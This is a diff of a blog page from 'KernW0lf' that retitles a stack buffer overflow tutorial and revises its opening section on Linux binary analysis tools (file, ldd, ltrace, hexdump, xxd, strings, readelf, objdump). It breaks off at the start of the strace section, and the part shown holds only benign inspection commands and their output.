@@ -1,10 +1,8 @@
 <!DOCTYPE html>
 <html lang="en-us">
-
-<head>
-
+  <head>
     <title>
-Module 1: Linux Stack Smashing | KernW0lf
+1. Understanding Stack-Based Buffer Overflows | KernW0lf
 </title>
 
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
@@ -25,32 +23,47 @@ Module 1: Linux Stack Smashing | KernW0lf
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
 
-    
-    
-    
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
 
-
+    
+    
+    
+    <link
+      href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
 
     <style>
-        body {
-             
-            font-family: 'Fira Code','Source Code Pro','Roboto', sans-serif; 
-        }
-        .highlight {
-            font-size: 20px;  
-        }
+      @font-face {
+        font-family: "0xProto Nerd Font";  
+        src: url("/fonts/0xProtoNerd/0xProtoNerdFont-Regular.ttf")
+          format("truetype");
+        font-weight: normal;
+        font-style: normal;
+      }
 
-        
+      body {
+         
+        font-family: "Fira Code Retina", "Source Code Pro", "Roboto", sans-serif;
+      }
+      code {
+        font-family: "Source Code Pro", monospace, "Courier New", Courier,
+          monospace;
+        font-size: 17px;
+      }
+
+      .highlight {
+        font-family: "Source Code Pro", monospace;
+        font-size: 20px;
+      }
     </style>
+
     
+    
+  </head>
 
-</head>
-
-<body>
-
+  <body>
     <div class="flexWrapper">
-        <header class="headerWrapper">
+      <header class="headerWrapper">
     <div class="header">
         <div>
             <a class="terminal" href="http://kernw0lf.github.io/">
@@ -83,11 +96,10 @@ Module 1: Linux Stack Smashing | KernW0lf
 </header>
 
 
-        <div class="content">
-            <main class="main">
-                
+      <div class="content">
+        <main class="main">
 <div class="postWrapper">
-    <h1>Module 1: Linux Stack Smashing</h1>
+    <h1>1. Understanding Stack-Based Buffer Overflows</h1>
     
     
     <section class="postMetadata">
@@ -98,11 +110,11 @@ Module 1: Linux Stack Smashing | KernW0lf
             
                 <dt>published</dt>
                 
-                <dd><time datetime="2024-02-29">February 29, 2024</time></dd>
+                <dd><time datetime="2024-10-29">October 29, 2024</time></dd>
             
             
                 <dt>reading time</dt>
-                <dd>14 minutes</dd>
+                <dd>30 minutes</dd>
             
         </dl>
     </section>
@@ -112,77 +124,86 @@ Module 1: Linux Stack Smashing | KernW0lf
 <p>Before diving into the world of Linux stack smashing, it&rsquo;s crucial to begin with binary analysis. Analyzing the binary executable provides us with valuable insights into its structure, functions, and potential vulnerabilities. Through binary analysis, we can identify the layout of the stack, the presence of buffer overflows, and other crucial details that will aid us in crafting our exploit. This initial step sets the foundation for our exploit development process, allowing us to understand the inner workings of the program and how we can manipulate its behavior. Let&rsquo;s embark on this journey of analysis to unravel the secrets hidden within the binary.</p>
 <p>Following tools can be used to analyze the binary:</p>
 <p><strong>1. file</strong></p>
-<p>One of the fundamental tools in binary analysis is the file command. This versatile tool provides essential information about a binary file&rsquo;s type, architecture, and more. The file command starts by looking at the &ldquo;magic numbers&rdquo; or file signatures present in the file. file uses a database called magic.mgc or magic to map file signatures to file types.</p>
+<p>One of the fundamental tools in binary analysis is the <code>file</code> command. This versatile tool provides essential information about a binary file&rsquo;s type, architecture, and more. The <code>file</code> command starts by looking at the &ldquo;magic numbers&rdquo; or file signatures present in the file. <code>file</code> uses a database called <code>magic.mgc</code> or <code>magic</code> to map file signatures to file types.</p>
 <p>Here&rsquo;s an example of using the file command and its output:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ file /bin/ls
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file /bin/ls
 </span></span><span style="display:flex;"><span>/bin/ls: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>5a23a3d88888f69f1ae22e25a8f32d5a36f1662f, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, stripped
 </span></span></code></pre></div><p>The output tells us that it&rsquo;s an ELF (Executable and Linkable Format) 64-bit binary for an x86-64 architecture, dynamically linked, and stripped of debugging symbols.</p>
 <p><strong>2. ldd</strong></p>
-<p>The ldd command is a valuable tool for examining the shared library dependencies of an executable or a shared library in a Linux system. When run with the path to an executable, ldd displays a list of the shared libraries that the executable is linked against. This information is crucial for understanding the runtime environment required by the executable and ensuring that all necessary libraries are present on the system.
-It&rsquo;s important to note that ldd works with dynamically linked binaries. If a binary is statically linked (meaning it includes all necessary libraries within itself), ldd will not provide any output related to shared library dependencies.</p>
+<p>The <code>ldd</code> command is a valuable tool for examining the shared library dependencies of an executable or a shared library in a Linux system. When run with the path to an executable, <code>ldd</code> displays a list of the shared libraries that the executable is linked against. This information is crucial for understanding the runtime environment required by the executable and ensuring that all necessary libraries are present on the system.
+It&rsquo;s important to note that <code>ldd</code> works with dynamically linked binaries. If a binary is statically linked (meaning it includes all necessary libraries within itself), <code>ldd</code> will not provide any output related to shared library dependencies.</p>
 <p>Refer file_dyn and file_stat in my github repo.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gcc file.c -o file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc file.c -o file_dyn
 </span></span><span style="display:flex;"><span>$ ldd file_dyn
 </span></span><span style="display:flex;"><span>	linux-vdso.so.1 <span style="color:#f92672">(</span>0x00007ffdcd9e8000<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>	libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0x00007f977b625000<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>	/lib64/ld-linux-x86-64.so.2 <span style="color:#f92672">(</span>0x00007f977b837000<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>Each line in the output corresponds to a shared library, along with its full path on the system and the memory address at which it is loaded. This information helps in troubleshooting missing library dependencies and resolving issues related to shared libraries.</p>
-<p>For example, running ldd on a statically linked binary like the following binary will not display any shared library dependencies:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gcc -static file.c -o file_stat
+<p>For example, running <code>ldd</code> on a statically linked binary like the following binary will not display any shared library dependencies:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -static file.c -o file_stat
 </span></span><span style="display:flex;"><span>$ ldd file_stat
 </span></span><span style="display:flex;"><span>	  not a dynamic executable
 </span></span></code></pre></div><p>Also, you can verify that the size of statically linked library is more than that of dynamically linked.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ du -h file_stat file_dyn 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ du -h file_stat file_dyn 
 </span></span><span style="display:flex;"><span>720K	file_stat
 </span></span><span style="display:flex;"><span>16K	file_dyn
 </span></span></code></pre></div><p><strong>3. ltrace</strong></p>
-<p>After confirming that the given library is dependent on external libraries, it&rsquo;s time to trace the functions that are called from those libraries. ltrace is a dynamic tracing utility in Linux that enables us to intercept and display library calls made by an executed program. By running ltrace followed by the path to an executable, we can observe the library functions being called, along with the arguments passed to them. This tool is invaluable for understanding how a program interacts with shared libraries at runtime, providing insights into its behavior and aiding in debugging and analysis.
-To illustrate the utility of ltrace in binary analysis, let&rsquo;s consider a scenario where we have a shared library libadd.so that exports an add function, which takes two integers as parameters and returns their sum.</p>
+<p>After confirming that the given library is dependent on external libraries, it&rsquo;s time to trace the functions that are called from those libraries. <code>ltrace</code> is a dynamic tracing utility in Linux that enables us to intercept and display library calls made by an executed program. By running <code>ltrace</code> followed by the path to an executable, we can observe the library functions being called, along with the arguments passed to them. This tool is invaluable for understanding how a program interacts with shared libraries at runtime, providing insights into its behavior and aiding in debugging and analysis.
+To illustrate the utility of <code>ltrace</code> in binary analysis, let&rsquo;s consider a scenario where we have a shared library libadd.so that exports an add function, which takes two integers as parameters and returns their sum.</p>
 <p>First, we&rsquo;ll create the libadd.so library with a simple add function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gcc -shared -fPIC add.c -o libadd.so
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -shared -fPIC add.c -o libadd.so
 </span></span></code></pre></div><p>Now, let&rsquo;s create a program that uses this add function from libadd.so.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gcc -L. -ladd useAdd.c -o useAdd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -o useAdd useAdd.c -L. -ladd
 </span></span></code></pre></div><p>Now, here comes the exciting part. We can use ltrace to trace the library calls made by main to libadd.so:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ LD_LIBRARY_PATH<span style="color:#f92672">=</span>. ltrace ./useAdd
-</span></span><span style="display:flex;"><span>add<span style="color:#f92672">(</span>5, 3, 0x7fff4180f508, 0x556fab537dc8<span style="color:#f92672">)</span>        <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span>printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Result: %d\n&#34;</span>, 8Result: <span style="color:#ae81ff">8</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>                        <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ LD_LIBRARY_PATH<span style="color:#f92672">=</span>. ltrace ./useAdd
+</span></span><span style="display:flex;"><span>add<span style="color:#f92672">(</span>5, 3, 3, 0x55a0de3cbdc8<span style="color:#f92672">)</span>                           <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;The sum of %d and %d is %d\n&#34;</span>, 5, 3, 8The sum of <span style="color:#ae81ff">5</span> and <span style="color:#ae81ff">3</span> is <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>        <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
 </span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
 </span></span></code></pre></div><p>The output will show the add function being called with the arguments 5 and 3, and the resulting sum 8.</p>
 <p><strong>4. hexdump</strong></p>
-<p>When it comes to binary analysis, one of the essential tools in a Linux developer&rsquo;s arsenal is hexdump. This command-line utility allows us to examine and manipulate binary files at a byte level, providing a hexadecimal and ASCII representation of the file&rsquo;s contents.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ hexdump <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
+<p>When it comes to binary analysis, one of the essential tools in a Linux developer&rsquo;s arsenal is <code>hexdump</code>. This command-line utility allows us to examine and manipulate binary files at a byte level, providing a hexadecimal and ASCII representation of the file&rsquo;s contents.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hexdump <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>Here are a few common options:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>  -C: Display the output in a canonical hex+ASCII display.
-</span></span><span style="display:flex;"><span>  -n: Limit the number of bytes to dump.
-</span></span><span style="display:flex;"><span>  -s: Skip a number of bytes from the beginning.
-</span></span></code></pre></div><p>We will inspect first 64 bytes of file_dyn:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ hexdump -C -n <span style="color:#ae81ff">64</span> file_dyn 
+<pre tabindex="0"><code class="language-plaintxt" data-lang="plaintxt">  -C: Display the output in a canonical hex+ASCII display.
+  -n: Limit the number of bytes to dump.
+  -s: Skip a number of bytes from the beginning.
+</code></pre><p>We will inspect first 64 bytes of file_dyn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hexdump -C -n <span style="color:#ae81ff">64</span> file_dyn 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  7f <span style="color:#ae81ff">45</span> 4c <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |.ELF............|
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000010</span>  <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">00</span> 3e <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |..&gt;.....P.......|
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000020</span>  <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  |@........6......|
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000030</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">38</span> <span style="color:#ae81ff">00</span>  0d <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> 1f <span style="color:#ae81ff">00</span> 1e <span style="color:#ae81ff">00</span>  |....@.8...@.....|
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000040</span>
+</span></span></code></pre></div><p>While <code>hexdump</code> is a powerful utility, there is an alternative tool called xxd, which also allows for viewing binary files in a hex format.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ xxd -l <span style="color:#ae81ff">64</span> file_dyn
+</span></span><span style="display:flex;"><span>00000000: 7f45 4c46 <span style="color:#ae81ff">0201</span> <span style="color:#ae81ff">0100</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  .ELF............
+</span></span><span style="display:flex;"><span>00000010: <span style="color:#ae81ff">0300</span> 3e00 <span style="color:#ae81ff">0100</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">5010</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  ..&gt;.....P.......
+</span></span><span style="display:flex;"><span>00000020: <span style="color:#ae81ff">4000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">9036</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span>  @........6......
+</span></span><span style="display:flex;"><span>00000030: <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">4000</span> <span style="color:#ae81ff">3800</span> 0d00 <span style="color:#ae81ff">4000</span> 1f00 1e00  ....@.8...@.....
 </span></span></code></pre></div><p><strong>5. strings</strong></p>
-<p>Now that we&rsquo;ve examined the binary at byte level, let&rsquo;s move on to another useful tool in binary analysis: the strings command. The strings command in Linux is a simple yet powerful utility that extracts readable strings from binary files.
-The -n option specifies the minimum string length to be included in the output.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ strings -n <span style="color:#ae81ff">6</span> file_dyn
+<p>Now that we&rsquo;ve examined the binary at byte level, let&rsquo;s move on to another useful tool in binary analysis: the <code>strings</code> command. The <code>strings</code> command in Linux is a simple yet powerful utility that extracts readable strings from binary files.
+The <code>-n</code> option specifies the minimum string length to be included in the output.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings -n <span style="color:#ae81ff">6</span> file_dyn
 </span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
 </span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>kernw0lf...
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Hello World
+</span></span><span style="display:flex;"><span>GCC: <span style="color:#f92672">(</span>Debian 14.2.0-6<span style="color:#f92672">)</span> 14.2.0
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>file.c
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><p>This command extracts printable strings from the file_dyn binary, but it only includes strings that are at least 6 characters long.
 Strings extraction is a crucial initial step in binary reverse engineering and forensic analysis. It uncovers valuable clues about a binary&rsquo;s purpose, origin, and potential errors or debug information embedded within.</p>
 <p><strong>6. readelf</strong></p>
-<p>Another essential tool in the binary analysis toolkit is readelf. This command-line utility is used to display information about ELF (Executable and Linkable Format) files, providing detailed insights into the structure of binary executables and shared libraries.</p>
+<p>Another essential tool in the binary analysis toolkit is <code>readelf</code>. This command-line utility is used to display information about ELF (Executable and Linkable Format) files, providing detailed insights into the structure of binary executables and shared libraries.</p>
 <p><strong>Commonly used command line arguments</strong></p>
 <ul>
 <li>File Header (-h/--file-header)</li>
 </ul>
 <p>This options displays the ELF file header of a binary file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -h file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -h file_dyn
 </span></span><span style="display:flex;"><span>ELF Header:
 </span></span><span style="display:flex;"><span>  Magic:   7f <span style="color:#ae81ff">45</span> 4c <span style="color:#ae81ff">46</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> 
 </span></span><span style="display:flex;"><span>  Class:                             ELF64
@@ -211,7 +232,7 @@ Strings extraction is a crucial initial step in binary reverse engineering and f
 <li>Section Headers (-S/--section-headers)</li>
 </ul>
 <p>This option displays detailed information about each section in the ELF file. Section headers include names, types, addresses, sizes, and other attributes.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -S file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -S file_dyn
 </span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">31</span> section headers, starting at offset 0x3690:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Section Headers:
@@ -288,7 +309,7 @@ Strings extraction is a crucial initial step in binary reverse engineering and f
 <li>Symbol Table (-s/--syms/--symbols)</li>
 </ul>
 <p>The symbol table contains information about symbols used in the binary, including functions and variables. This is invaluable for understanding program logic.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -s file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -s file_dyn
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Symbol table <span style="color:#e6db74">&#39;.dynsym&#39;</span> contains <span style="color:#ae81ff">7</span> entries:
 </span></span><span style="display:flex;"><span>   Num:    Value          Size Type    Bind   Vis      Ndx Name
@@ -343,7 +364,7 @@ Strings extraction is a crucial initial step in binary reverse engineering and f
 </ul>
 <p>This option reveals the dynamic linking information, including shared library dependencies and versioning details.
 No dynamic linking information will be displayed for statically linked binaries, as they do not rely on shared libraries at runtime.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -d file_dyn 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -d file_dyn 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Dynamic section at offset 0x2de0 contains <span style="color:#ae81ff">26</span> entries:
 </span></span><span style="display:flex;"><span>  Tag        Type                         Name/Value
@@ -381,7 +402,7 @@ No dynamic linking information will be displayed for statically linked binaries,
 <li>Section Headers and Their Contents (-x/--hex-dump=)</li>
 </ul>
 <p>This option displays the hexadecimal and ASCII representation of the content of a specific section. For instance, to examine the .text section</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -x .text file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -x .text file_dyn
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Hex dump of section <span style="color:#e6db74">&#39;.text&#39;</span>:
 </span></span><span style="display:flex;"><span>  0x00001050 31ed4989 d15e4889 e24883e4 f0505445 1.I..^H..H...PTE
@@ -405,7 +426,7 @@ No dynamic linking information will be displayed for statically linked binaries,
 <li>Display Dynamic String Table (--dyn-syms)</li>
 </ul>
 <p>This option prints dynamic symbols, which are essential for dynamic linking analysis.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf --dyn-syms file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf --dyn-syms file_dyn
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Symbol table <span style="color:#e6db74">&#39;.dynsym&#39;</span> contains <span style="color:#ae81ff">7</span> entries:
 </span></span><span style="display:flex;"><span>   Num:    Value          Size Type    Bind   Vis      Ndx Name
@@ -417,7 +438,7 @@ No dynamic linking information will be displayed for statically linked binaries,
 </span></span><span style="display:flex;"><span>     5: <span style="color:#ae81ff">0000000000000000</span>     <span style="color:#ae81ff">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>     6: <span style="color:#ae81ff">0000000000000000</span>     <span style="color:#ae81ff">0</span> FUNC    WEAK   DEFAULT  UND <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>@GLIBC_2.2.5 <span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p><strong>7. objdump</strong></p>
-<p>Objdump, a part of the GNU Binutils suite, is a versatile command-line tool that serves as a Swiss Army knife for binary analysis. It offers a wide range of options to examine object files, executables, shared libraries, and core dump files. Binaries are generated when source code is compiled, producing machine language instructions specific to the CPU architecture. Objdump reads these binaries and displays their architecture-specific assembly language instructions, providing insights into program operations at the CPU level.</p>
+<p><code>Objdump</code>, a part of the GNU Binutils suite, is a versatile command-line tool that serves as a Swiss Army knife for binary analysis. It offers a wide range of options to examine object files, executables, shared libraries, and core dump files. Binaries are generated when source code is compiled, producing machine language instructions specific to the CPU architecture. <code>Objdump</code> reads these binaries and displays their architecture-specific assembly language instructions, providing insights into program operations at the CPU level.</p>
 <p><em>Example Usages:</em></p>
 <ul>
 <li>Disassemble an Executable</li>
@@ -432,75 +453,525 @@ No dynamic linking information will be displayed for statically linked binaries,
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ objdump -h file_dyn
 </span></span></code></pre></div><p><strong>8. strace</strong></p>
-<p>strace is a powerful diagnostic tool used in Linux and Unix-like operating systems to monitor system calls and signals. This command-line utility is invaluable for troubleshooting and understanding how programs interact with the operating system kernel. By tracing the system calls made by a program, developers and system administrators can gain insights into its behavior, identify issues such as file access problems or incorrect permissions, and optimize performance.
-If you have used ltrace, mentioned earlier, think of strace being similar. The only difference is that, instead of calling a library, the strace utility traces system calls. System calls are how you interface with the kernel to get work done.</p>
+<p>A system call is a mechanism that allows user-space programs to request services from the kernel, effectively bridging the gap between the user and the system. When a program makes a system call, it transitions from user mode to kernel mode, which provides the necessary privileges to perform operations that are otherwise restricted in user mode.
+<code>strace</code> is a powerful diagnostic tool used in Linux and Unix-like operating systems to monitor system calls and signals. This command-line utility is invaluable for troubleshooting and understanding how programs interact with the operating system kernel. By tracing the system calls made by a program, developers and system administrators can gain insights into its behavior, identify issues such as file access problems or incorrect permissions, and optimize performance.
